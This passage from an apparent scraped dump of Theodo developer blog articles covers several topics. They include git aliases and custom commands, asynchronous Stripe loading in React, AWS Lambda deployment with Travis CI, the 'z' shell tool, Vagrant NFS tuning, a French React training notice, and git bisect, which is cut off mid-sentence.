Edit -> triggers\nAdd a new trigger healthCheck() run it hourly (or as you prefer)\nYou are done \ud83d\ude09 unplug your raspberry pi or kill your tunnel and wait for an email\n\nAlright! You are ready to do awesome stuff! In part 2 of the article I\u2019ll show how to plug webhooks of github and CircleCi so you see red lights when your deployment fails :O, see the GIF.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSammy Teillet\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBonjour \u00e0 tous,\nNous organisons tout l\u2019\u00e9t\u00e9 des cours sur React au sein de Theodo. Cette 3\u00e8me session aura lieu le mercredi 2/08/2017 \u00e0 19h dans nos locaux pr\u00e8s du m\u00e9tro Rome. Nous l\u2019ouvrons aux personnes ext\u00e9rieures qui souhaitent apprendre \u00e0 mieux ma\u00eetriser ce framework Javascript. Elle sera sur le th\u00e8me de la mise en place de Redux et sera dirig\u00e9e par un de nos experts React Woody Rousseau\u00a0ici en conf\u00e9rence \u00e0 React Amsterdam.\n\nLa formation est gratuite et limit\u00e9e aux 10 premi\u00e8res personnes qui s\u2019inscriront. Une connaissance des bases de React est requise. Vous \u00eates les bienvenus et pour vous inscrire c\u2019est par ici.\n\u00c0 mercredi,\nMaxime\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAs programmers, we use Git everyday.\nThe time saved by a good Git config is remarkable!\nIn particular, amongst the most useful features of Git is the ability to create your own Git commands.\nAliases\nYou probably know about aliases.\nWho still has time to type git status? In 2017?\nWe all have the usual co = checkout or st = status in our .gitconfig, we\u2019re here for sexier stuff.\nHere is a compilation of useful aliases I\u2019ve created, adapted or shamelessy stolen from the interwebs.\nFeel free to take and share:\n[alias]\r\n    ###########################################\r\n    # The essentials\r\n    ###########################################\r\n    # -sb for a less verbose status\r\n    st = status -sb\r\n    # Easy commits fixup. To use with git rebase -i --autosquash\r\n    fixup = commit --fixup\r\n    # If you use Hub by Github\r\n    ci = ci-status\r\n\r\n    ###########################################\r\n    # The command line sugar\r\n    ###########################################\r\n    # Pop your last commit out of the history! No change lost, just unindexed\r\n    pop = reset HEAD^\r\n    # Fix your last commit without prompting an editor\r\n    oops = commit --amend --no-edit\r\n    # Add a file/directory to your .gitignore\r\n    ignore = \"!f() { echo \\\"$1\\\" >> .gitignore; }; f\"\r\n    # A more concise and readable git log\r\n    ls = log --pretty=format:\"%C(yellow)%h\\\\ %Creset%s%Cblue\\\\ [%cn]\\\\%Cred%d\" --decorate\r\n    # Same as above, with files changed in each commit\r\n    ll = ls --numstat\r\n    # Print the last commit title & hash\r\n    last = --no-pager log -1 --oneline --color\r\n\r\n    ###########################################\r\n    # This much sugar may kill you\r\n    ###########################################\r\n    # Show which commits are safe to amend/rebase\r\n    unpushed = log @{u}..\r\n    # Show what you've done since yesterday to prepare your standup\r\n    standup = log --since yesterday --author $(git config user.email) --pretty=short\r\n    # Show the history difference between a local branche and its remote\r\n    divergence = log --left-right --graph --cherry-pick --oneline $1...origin/$1\r\n    # Quickly solve conflicts using an editor and then add the conflicted files\r\n    edit-unmerged = \"!f() { git diff --name-status --diff-filter=U | cut -f2 ; }; vim `f`\"\r\n    add-unmerged = \"!f() { git diff --name-status --diff-filter=U | cut -f2 ; }; git add `f`\"\r\n\nWhat is the bang for?\nNote the git ignore command, alias to \"!f() { echo \\\"$1\\\" >> .gitignore; }; f\".\nThis looks weird, let\u2019s explain it:\nThe ! allows to escape to a shell, like bash or zsh.\nThen, we define a function f() that does what we want (here, appending the first argument to .gitignore).\nFinally, we call this function.\nI\u2019ve had a lot of trouble understanding why using a function is necessary, as the shell escaping does interpret positional parameters such as $1.\nIt\u2019s actually a neat trick: git appends your parameters to your expanded command (it is an alias after all) which leads to unwanted behavior.\nLet\u2019s see an example:\nLet\u2019s say you have the alias echo = !echo \"echoing $1 and $2\".\n$ git echo a b\r\nechoing a and b a b\r\n\nWow! What happened?\nGit expanded your alias escaping to a shell, which interpreted positional parameters.\nIt means that $ git echo a b was equivalent to $ echo \"echoing a and b\" a b, hence the output.\nNow wrapped in a function: echo = \"!f(){ echo \"echoing $1 and $2\"; };f\".\nIn this case, $ git echo a b is equivalent to $ f(){ echo \"echoing $1 and $2\" }; f a b.\nThe parameters still are appended (not interpreted by the shell because they\u2019re function parameters), but they are used in the call to the f function!\nWriting your own commands\nAliases are great, and their power is almost unlimited when using the !f(){...};f trick.\nBut you need to escape quotes and new lines, you don\u2019t have syntaxical coloration and it makes your ~/.gitconfig very long and unreadable.\nWhat if you want to do really complex stuff?\nDoeth not despair, for I have the solution.\nIt happens that Good Guy Git is looking in your $PATH when you call it with a command: typing $ git wow will look for an executable named git-wow everywhere in your $PATH!\nThis means you can define your own git commands easily by writing eg bash, python or by compiling an executable.\nLet\u2019s do that.\nHere is a simple git-wip bash script, that takes all changes and commit them with a \u201cWIP\u201d commit message.\nIf the last commit message already was \u201cWIP\u201d, amend this commit instead:\n#!/usr/bin/env bash\r\n\r\ngit add -A\r\n\r\nif [ \"$(git log -1 --pretty=%B)\" = \"WIP\" ]; then\r\n    git commit --amend --no-edit\r\nelse\r\n    git commit -m \"WIP\"\r\nfi\r\n\nAnd its friend, git-unwip that undo the last commit if its commit message was \u201cWIP\u201d, else it\u2019s a no-op:\n#!/usr/bin/env bash\r\n\r\nif [ \"$(git log -1 --pretty=%B)\" = \"WIP\" ]; then\r\n    git pop # defined as an alias, remember!\r\nelse\r\n    echo \"No work in progress\"\r\nfi\r\n\nPut these two scripts in your $PATH (/usr/local/bin for exemple), and you can call git wip or git unwip until your fingers bleed.\nThat\u2019s all folks\nNow run along kids, and go create your own aliases and custom commands!\nWhy not a script to start a new feature branch (sync with remote, prune local branches, create a new branch), or a script to open GitHub pull requests on multiple branches?\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tWilliam Duclot\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOn my current project, the team (and our client \ud83d\ude31) realised our React website performance rating was below industry-standard, using tools like Google Page Speed Insights.\nAs reported by the tool, the main cause for this are render-blocking scripts like Stripe, Paypal, fonts or even the bundle itself.\nLet\u2019s take Stripe as example.\nThe API of services like Stripe or Paypal are only available by sourcing from a <script /> tag in your index.html.\nIn the React code, the library becomes accessible from your Javascript window object once the script has loaded:\n<!-- ./index.html -->\r\n<script src=\"https://js.stripe.com/v2/\"></script>\r\n\n// ./somewhere/where/you/need/payment.js\r\nconst Stripe = window.Stripe;\r\n...\r\n\nThe solution is to delay the loading of the script (async or defer attributes in the <script />) to let your page display faster and thus get a better performance score.\nBut a problem happens when the bundle loads: the script may still not be ready at load time, in which case you won\u2019t be able to get its value from window for further use.\n<!-- ./index.html -->\r\n<script src=\"https://js.stripe.com/v2/\" async></script>\r\n\n// ./somewhere/where/you/need/payment.js\r\nconst Stripe = window.Stripe;\r\n\r\nconst validationFunctions = {\r\n  ...\r\n  validateAge: age => age > 17,\r\n  validateCardNumber: Stripe.card.validateCardNumber,\r\n  validCardCVC: Stripe.card.validateCVC,\r\n  ...\r\n}\r\n\nResult in the console:\n\nWith this code, Stripe can\u2019t be loaded after the bundle. Your bundle crashes!\n\n\n\nBut what is the impact of solving this problem?\nBusiness benefits of delaying the loading of your script\n\nYour website loads faster which leads to better customer retention\nYour website gets better SEO visibility\u2026\n\u2026 as proven by your better mark on performance benchmarks like Google Page Speed Insights\n\nObjective measures of your abilities are rare, take this opportunity to blow your client/stakeholder/team\u2019s mind!\n\u201cBut what good does Google Page Speed Insights?\u201d See below for yourself!\nBefore loading asynchronously. Here\u2019s how we ranked in the beginning:\n\n6 scripts are delaying the loading of our website. We want to get rid of all those items.\n\nResult after loading all scripts asynchronously: render blocking scripts have disappeared!\nScore on mobile is now 83/100 up from 56/100, and desktop performance is more than 90!\n\nThe Solution\nindex.html\n<!-- Load the script asynchronously -->\r\n\r\n<script type=\"text/javascript\" src=\"https://js.stripe.com/v2/\" async></script>\r\n\n./services/Stripe.js\n  // 1) Regularly try to get Stripe's script until it's loaded.\r\n\r\nconst stripeService = {};\r\nconst StripeLoadTimer = setInterval(() => {\r\n    if (window.Stripe) {\r\n      stripeService.Stripe = window.Stripe;\r\n      clearInterval(StripeLoadTimer);\r\n    }\r\n}, 100);\r\n\r\n// Customise the Stripe object here if needed\r\n\r\nexport default stripeService;\r\n\n./somewhere/where/you/need/payment.js\n// Use a thunk where an attribute of your Stripe variable is needed.\r\n\r\nimport stripeService from './services/stripe';\r\n\r\nconst validationFunctions = {\r\n  ...\r\n  validateAge: age => age > 17,\r\n  validCardNumber: (...args) => stripeService.Stripe.card.validateCardNumber(...args),\r\n  validCardCVC: (...args) => stripeService.Stripe.card.validateCVC(...args),\r\n  ...\r\n}\r\n\nWhy this architecture?\nWe have assigned the Stripe variable in a ./services/Stripe.js file to avoid re-writting the setInterval everywhere Stripe is needed.\nAlso, this allows to do some custom config of the Stripe variable in one place to export that config for further use.\nWhy use thunks?\nAt bundle load time, the Stripe variable is still undefined.\nIf you don\u2019t use a thunk, Javascript will try to evaluate at bundle load time the attributes of Stripe (here, Stripe.card for example) and fail miserably: your website won\u2019t even show.\nWhy use this weird stripeService object?\nIn ES6, export exports a live binding to the variable from the file it was created in.\nThis means that the variable imported in another file has at all times the same value as the one in the original file.\nHowever there is an exception: if you used the Stripe = window.Stripe and export default Stripe; syntax as usual, you only export a copy of Stripe evaluated at bundle load time and not a binding to the variable itself. So in that case you don\u2019t get the result of the assignment that happens in the setInterval after the <script /> is loaded if you merely export window.Stripe.\nThe airbnb-linter-complient trick to overcome this (thanks Louis Zawadzki!) is to wrap window.Stripe in a stripeService object.\nYou are all set on the path to 100/100 performance!\n\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tF\u00e9lix M\u00e9zi\u00e8re\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe purpose of this tutorial is to automatically deploy a serverless API with two deployment environments (development and production) from scratch. Using the Amazon Web Services (AWS), this will be a matter of minutes! We will use Node.js and several tools which all come with a freemium model:\n\nAWS Lambdas are functions in the cloud that can be triggered without bothering with the infrastructure. You upload your code to AWS and it can be run anytime with high availability on any of their servers. Need more resources? No problem, Amazon scales for you. Idle time? Don\u2019t pay for it anymore, you only pay when your API is called.\nAWS API Gateway helps you manage and version APIs and makes it easy to connect incoming requests with Lambda functions.\nTravis CI enables you to automatically test and deploy your code from Github.\nYou can as well use any other continuous integration (CI) tool, such as CircleCI.\n\nA repo with all needed scripts is available on my Github, but I will walk you through the three main steps to setup your API:\n\nhave a working application online running the code of your choice,\nmake continuous deployment happen: let any change of your code on Github automatically deploy to the API,\ndeal with several environments: one for production, one for development.\n\nSetup your Lambda and your API\nFirst set up an account on AWS. It needs up to 24 hours to be authorized. You may have to enter your credit card details, but no worries: AWS Lambda\u2019s free tier includes among other things 1 million free requests per month!\nYour first Lambda\nTo begin with, we\u2019re going to set up our very first Lambda function. On the upper panel of the AWS management console, select Lambda > Create a Lambda function > Blank function.\nIn the true tradition of computer programs, our application will output a fancy \u2018Hello world\u2019. When you\u2019re asked to type in the function code, use a hello-world template. It follows the callback logic that Lambda functions use:\nexports.handler = (event, context, callback) => {\r\n  callback(null, {\r\n    Hello: 'World'\r\n  });\r\n};\r\n\nYour first API\nFor the next operations, you\u2019ll need to go to the Amazon API Gateway and create a Hello World API from scratch (Create API > New API). Create a /hello-world resource (Actions > Create resource) and a GET method linked to our freshly created Lambda function (Actions > Create method > Integration type: Lambda function).\nYou\u2019ll notice that the Amazon console is pretty intuitive. If you get stuck however, I strongly recommend you this excellent walkthrough on building an API to expose a lambda function. AWS resources are particularly well-made and fully comprehensive, so don\u2019t hesitate to go through the documentation.\nSee your app in production!\nLet\u2019s deploy our work in production! On the API Gateway, go to Actions > Deploy API, create a production stage and\u2026 simply deploy by clicking the button.\nOn the stage editor screen, Amazon provides you with the invoke URL. Call your newly created API by typing said URL with the route /hello-world in your browser or use CURL to make a GET request.\nMake deployment automatic using Travis CI\nNow that the configuration is over, let\u2019s start with the code already! If you browse the project, you\u2019ll notice two main folders:\n\n./lambda contains the index.js with your function code as well as the Node dependencies in the package.json.\n./scripts contains the deployment script that Travis will use to update your function\u2019s code at each new commit.\n\nCreate these two folders : mkdir lambda && mkdir scripts\nI recommend you work on your own repository, so you learn to set it up by yourself. Begin by setting up a Git repository (git init) and a Node project with cd lambda && npm init -y.\nFill the code you want AWS to execute in ./lambda/index.js.\nDeployment script\nIn ./scripts/aws-lambda-deploy, you will write the code for automatically updating a Lambda function.\n\nIt loads all necessary packages including the node package for the AWS SDK and configure your region.\n\nconst AWS = require('aws-sdk');\r\nconst Promise = require('bluebird');\r\n\r\nconst lambda = new AWS.Lambda({\r\n  region: 'us-west-2'\r\n});\r\n\n\nIt zips the folder containing the Lambda function.\n\nconst cwd = process.cwd();\r\nconst zipLambdaCommand = `\r\n  cd ${cwd}/lambda/${lambdaName}/ &&\r\n  npm install --production &&\r\n  zip -r ${lambdaName}.zip * --quiet`;\r\n\n\nIt updates the Lambda function\u2019s code.\n\nconst lambdaUpdateFunctionCodeParams = {\r\n  FunctionName: `${lambdaName}`,\r\n  Publish: true,\r\n  ZipFile: read(`${cwd}/lambda/${lambdaName}/${lambdaName}.zip`)\r\n };\r\nlambdaUpdateFunctionCode(lambdaUpdateFunctionCodeParams);\r\n\nI prefer using promises instead of callbacks, so I promisify them using Bluebird. Then, all what the script does is chain both promises to zip und update the Lambda\u2019s code.\nI added a few console.log and also caught exceptions.\nTravis will then execute the script as stated in the travis.yml:\ndeploy:\r\n  - provider: script\r\n    script: node scripts/aws-lambda-deploy.js hello-world production\r\n    skip_cleanup: true\r\n    on:\r\n      branch: master\r\n\nSetup Travis CI\nOnce you have all your code on a repository on Github, it\u2019s easy to add it from Travis by going to your Travis profile and flicking the switch on corresponding to your repository. If you\u2019re a complete beginner with Travis, you may want to have a look to an introduction.\nTravis needs to be granted access to AWS in order to execute the deployment script. The two credentials that it needs to communicate with AWS (namely AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY) are to be found on the AWS console in My security credentials > Access keys. They are then stored in Travis as environment variables which you can set up and encrypt by clicking on Travis in More options > Settings.\nNow, each time you will commit your code, Travis will launch the tests and automate the deployment to AWS. Make a small change in your code, commit it and see by yourself what happens when browsing to the invoke URL of part 1.\nManage deployment environments\nMaking code deploy to AWS is really cool, but clearly not sufficient if you want to develop and test new ideas for your API. We\u2019d definitely need two environments: one for production and one for development, so your application is always available when you develop new features.\nConfigure two levels of code on the Lambda\nOn the Lambda console, at the lambda level, it is possible to configure aliases which will make the Lambda point to either production\u2019s or development\u2019s level of code.\nDo this by going to your lambda > Actions > Create alias, and create both production and development aliases, which should both point to a certain version of your code (e.g., version 1).\nConfigure two stages on the API\nOn the API Gateway console, in addition to the production stage, add a new stage to your API Gateway by clicking on your API > Stages > Create > Stage name: development.\nWe will use a stage variable to distinguish between production and development, and let the API trigger the Lambda with the corresponding alias. For both stages (production and development), set the NODE_ENV stage variables by navigating to the stage name > Stage variables > Add stage variable.\nType in NODE_ENV as name, and set a value of PRODUCTION for the production stage and DEVELOPMENT for the development stage.\nThe GET method shall now be edited in order to point to the requested stage. On the right panel, go to Resources > GET > Integration request > Lambda function and edit it. But this time, make sure you enter the name of your Lambda function concatenated with the alias: hello-world:${stageVariables.NODE_ENV}.\nNote: At this point, you will have to launch a command in order to extend your function\u2019s permissions.\nAmazon will kindly notify you by a popup, saying the API Gateway should be allowed to invoke the Lambda function. Configure your CLI and launch the said command for the functions hello-world:development and hello-world:production.\nBut how will the API Gateway pass this NODE_ENV variable? For that matter, you have to set the body mapping template by navigating to Add mapping template > application/json and enter the following code:\n#set($allParams = $input.params())\r\n  {\r\n    \"stageVariables\": {\r\n      #foreach($key in $stageVariables.keySet())\r\n        \"$key\" : \"$util.escapeJavaScript($stageVariables.get($key))\"\r\n        #if($foreach.hasNext),#end\r\n      #end\r\n    }\r\n  }\r\n\nDeploy on each environment\nIn addition to updating the Lambda\u2019s code, the deployment script shall also update the alias corresponding to the git branch that is being changed.\nconst lambdaUpdateAliasParams = {\r\n  FunctionName: `${lambdaName}`,\r\n  Name: lambdaAlias,\r\n  FunctionVersion: lambdaVersion\r\n};\r\nlambdaUpdateAlias(lambdaUpdateAliasParams);\r\n\nOn Git, each deployment environment corresponds to a certain branch. The branch master will deploy to production, and the branch develop to development. This appears in the travis.yml where we now automate the deployment for both environments:\n  - provider: script\r\n    script: node scripts/aws-lambda-deploy.js hello-world development\r\n    skip_cleanup: true\r\n    on:\r\n      branch: develop\r\n\nCreate the new branch for the development environment (git co -b develop), make a small change in the function\u2019s code, and push it to Github.\nWait for Travis to do its magic. You can check the deployment did not fail on Travis console. Once the build passed, if you go to the invoke URLs of each stage, you\u2019ll see the changes corresponding to each environment!\nConclusion\nAmazon provides you with a panel of services that integrate well with Lambda functions and the API Gateway. It goes from machine learning to logging tools or queuing services, and will help you in designing the best APIs. Possible future features for the API we just conceived are:\n\nhave different environment variables for each stage,\nencrypt the environment variables on AWS,\nschedule or define triggers to run your API at your convenience,\nmanage and organize logs.\n\nIn addition to that, many frameworks can now help you manage and deploy your Lambda web services, such as Serverless, Apex, or Zappa if you prefer using Python.\nIn serverless computing, you concentrate on coding simple functions instead of handling complex HTTP requests or focusing on architecture\u2019s issues. Automatic deployment, as we saw it, makes your application available for production and development in a few clicks. Making your own backend API and interacting with other APIs is a matter of minutes!\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre Marcenac\r\n  \t\t\t\r\n  \t\t\t\tWeb developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe most famous shell command is definitely cd. It allows you to navigate through your file tree.\nSometimes, reaching the targetted folder can be a painful journey leading to a laborious and infinite sequence of cd and ls.\nThankfully, some workarounds exist to make navigation less laborious, let us mention three of them:\n\nEnable autosuggestion in your favorite shell\nOpen an integrated terminal within the targetted folder from the file explorer\nSet up an alias in the .{zsh, bash}rc file to store a given command\n\nNone of these approaches is really satisfying from a web developer\u2019s perspective as it can quickly get time-consuming.\nHow about we could cd into any folder with one single command? Let me introduce you Z.\nZ is a shell script that will learn from your shell history in order to get you to your favorite folders with one command.\nThe word \u2018favorite\u2019 has to be defined here: the most frequent and recent. Z is based on the \u2018frecency\u2019 concept widely used in the Web World to build a proper and consistent URIs ranking.\nTo put it simply, Z attributes a mark to all the folders you have visited with your shell since Z was installed.\nInstallation\nAre you ready to save a lot of time? Let\u2019s install the beast.\nClone the Z github project on your machine:\ngit clone https://github.com/rupa/z.git\r\n\nIn the ./bashrc or ./zshrc shell config file, add the following line at the bottom:\n. /path/to/z.sh\r\n\nTo end up the setup, you have to source the freshly updated shell config file:\nsource ./bashrc\r\n\nYou can also restart your terminal to enable the z command.\nFrom now on, perform your very last cds through your file tree to help Z learn about your habits and enrich its database accordingly.\nTrust me, after a day or two, you won\u2019t use cd anymore to reach your daily working project.\nCraZy Tips\nLet\u2019s take the example of Max who works on his startup website. The path of the project folder is the following one: /home/max/Documents/Very/Long/And/Painful/Path/To/My/Startup/Website\nGiven that Max frecently cd into it since Z installation, he can simply run the command z website to reach it. z web or even z w can do the magic too since the folder is the best match.\nZ script is smart enough to change the current directory based on the regex you provided.\nTo get the ordered list of visited folders, type z -l in your terminal.\n97.5       /home/max/Documents/path/to/Happiness\r\n128        /home/max/Documents/path/to/Success\r\n256        /home/max/Documents/path/to/Startup/Fundraising/Investors\r\n408        /home/max/Documents/path/to/Startup/Legal\r\n544        /home/max/Documents/path/to/Startup/Marketing\r\n822        /home/max/Documents/Very/Long/And/Painful/Path/To/My/Startup/Website\r\n\nAs you can see, you also get the current mark of each folder. The next section deals with the Maths behind the scenes.\nTo retrieve information about ranking or timing, you can use the z -r or z -t commands.\nThe Frecency Algorithm\nFrecency is a blend of \u2018frequency\u2019 and \u2018recency\u2019 words. The algorithm that computes the folders ranking is pretty simple and crazy damn powerful.\nWe have to consider it as a two dimensional problem with two variables: rank and time.\nThe rank is a metric to assess frequency whereas time is the date of folder last visit, stored as a timestamp in seconds.\nFirst part: each time a folder is visited its rank is incremented by one unit and its time is updated.\nSecond part: frecency formula\nIf the current folder has been visited during the:\n\nlast hour: frecency = rank * 4\nlast day: frecency = rank * 2\nlast 7 seven days: frecency = rank / 2\n\nOtherwise, frecency = rank / 4\nBy default, Z uses the frecency to compute the best match. However, you can use -r and -t options to respectively cd into the best matching folder based only on ranking or time criteria.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tYohan Levy\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDo you wish your vagrant synced folders to have better performance? Especially if your host machine is running Linux. Here are some tricks to speed it up.\nSet up a synced folder\nVagrant is a convenient tool for quickly setting up your dev server, with just one vagrant up from the command-line, every team member can test new features locally.\nFor me, it is also essential to have a shared folder for the app\u2019s source code so that I can test my feature by simply saving the file from my favorite IDE and not having to deploy the code into the virtual machine every time.\nSetting up a basic synced folder is ridiculously easy as it only requires to add the following line in the Vagrantfile:\nconfig.vm.synced_folder \"src/\", \"/srv/website\"\nwith:\n\n\"src/\" synced folder path on your host\n\"/srv/website\" synced folder path on your guest\n\nWithout additional options, Vagrant will delegate the set up to your virtualization backend, e.g Virtualbox or VMware. Unfortunately, it is sometimes very slow.\nVagrant synced folders provides three alternatives:\n\nNFS (Network File System): default remote file system for Unix.\nRSync: slower than NFS, you would use it if nothing else works. Plus, rsync is one-way only.\nSMB (Server Message Block): only works with a Windows host.\n\nUsing NFS is therefore the best alternative in most situations.\nVagrant NFS\nTo set up an NFS synced folder you need to have nfsd (NFS server daemon) installed on your host and to specify it in your Vagrantfile as:\nconfig.vm.synced_folder \"src/\", \"/srv/website\", type: \"nfs\"\nWhen you reload your VM with vagrant reload, vagrant will do three things:\n\nIt will add an entry in the nfsd\u2019s configuration file /etc/exports on your host.\nIt will reload the NFS server daemon which will read the /etc/exports and accept connections.\nIt will connect to your guest machine and mount the remote folder.\n\nBoost your NFS\nNow, you might be happy with the default options. But sometimes, especially if you are a Linux user, you might feel that it is too slow. Luckily, Vagrant has a set of available options so let\u2019s tweak the NFS configuration a bit.\nThe NFS options that impact the speed of the synced folder can be separated in two categories:\n\nMount options (guest side):\n\n\"udp\" -> \"tcp\": The overhead incurred by TCP over UDP usually slows things down. However, it seems that the performance are slightly better with TCP in this particular case. (speed x1.5)\n\n\nNFSd options (host side):\n\n\"sync\" -> \"async\": in asynchronous mode, your host will acknowledge write requests before they are actually written onto disk. With a virtual machine, the network link between the host and guest is perfect so that there is no risk of data corruption. (speed x3)\n\n\n\nIf you want to override one option, you also need to write all the other default options. The optimal configuration in my situation is therefore:\nconfig.vm.synced_folder \"src/\", \"/srv/website\", type: \"nfs\",\r\n\u2003mount_options: ['rw', 'vers=3', 'tcp'],\r\n\u2003linux__nfs_options: ['rw','no_subtree_check','all_squash','async']\nFeel free to test which options work best for you.\nWith this setup, reloading a page of my app went from 9 to 2 seconds, making my work much easier. Moreover, I can finally access the legacy part of my application which timed out before.\nVincent Langlet, agile web developer at Theodo\nNote: File transfer speed can be easily measured with the dd utility :\ndd if=/dev/zero of=./test bs=1M count=100\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tHugo Lime\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo.\r\n\r\nPassionate about new technologies to make web apps stronger and faster.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOver my last working year, I have worked on two big projects, both more than 18 months old with several scrum teams working on it. And both facing a few regressions in production each week.\nAlthough I knew it existed and how it worked, I was not aware of the utility of git bisect and had never used it until a few weeks ago. Following a recommendation from the lead developer of my project, I started to use it to solve the regressions we were facing. And I feel like it may be the best way to do it.\nWhy ?\nYou will have the lines of code which introduced the regression in less than 10 minutes. Git bisect allows you to go through 1000 commits in 10 iterations; as an indication, in my current 3-4 developers team, 1000 commits represent about 3 months of work.\nMoreover, you will be able to find the dev who introduced the code. If you can reach them:\n\nYou will easily have the context of why this buggy code was introduced, pointing out what you should be careful not to break while solving the bug\nYou will help them progress. Finding out that some code you wrote was buggy because of this precise side effect, and that this was the best way to do it, is a very efficient way to get better.\nMost of all, you will be able to identify what information they lacked not to do this mistake, and thus which action to take to prevent similar regressions from happening.\n\nHaving the code and the context will help you a lot to find a solution to fix the bug.\nHow ?\nThe idea is really simple. Starting from two commits, one where the feature worked, and a more recent one with the feature broken, git bisect will perform a dichotomy to find the commit introducing the regression.\nIn practice, check out the current version of your code and start bisecting:\ngit bisect start\r\n\nSince the feature is currently broken, inform git that this version contains the buggy commit:\ngit bisect bad\r\n\nYou will now need to find a state where the feature worked. It may be an older reliable release, or you may as well just go through your history to find a maybe one or two months old commit with the feature working.\nOnce you found it, mark this version as reliable:\ngit bisect good v2.1.13\r\n\nOr:\ngit bisect good e627db2fc0a8ff1da6a67b5482c3f56dbedfaba1\r\n\nThe bisection will now actually start. Git checks out the commit in the middle of these two commits and you simply need to build your code and check whether the feature works or not. Indicate the result with git bisect good or git bisect bad and iterate. After a few iterations (git prompts you the number of required iterations after each step), you will have your faulty commit!\nFor more details on the options of the git bisect command, refer to the official git documentation\nNB: This is one more reason for making usable (i.e. with the application build working) and unitary commits. Without it, git bisect will be either harder to use or less useful, since finding out the faulty lines in a big commit might not be easy.\nMy personal story\nTo illustrate my point, let me give you an example where the git bisection helped me. The regression I had to solve was a 15 pixels margin missing under the images and title of a given page:\n\nA naive solution could have been to simply add a margin-bottom to the div containing those pictures. The regression would be solved, but we would have no idea of what caused it, and if it (or a similar one) would happen again.\nUsing git bisect, I found out that it was introduced about a month earlier. The margin-bottom still existed, but the property display: inline-block; had been removed from the <a> tag under the image, and thus the margin no longer applied. The css class applied to this tag being shared in the entire website, it was clear to me that the developer had changed it to improve another page design but forgot to check if it broke something on the images page. I could therefore move the margin-bottom from the <a> tag, where it was no longer needed, to the div containing the image and the text.\nYet, I checked with him, and it appeared that my hypothesis was completely wrong. He did check the broken page, but since a missing margin does not catch the eye, he didn\u2019t notice the regression. The fix was still valid, but we learnt something else from this talk: to properly test the design of a page, one should compare the design before and the design after, to make sure that the changes only affect the desired parts.\nAs illustrated by this example, git bisect will allow you to quickly find the fix to the 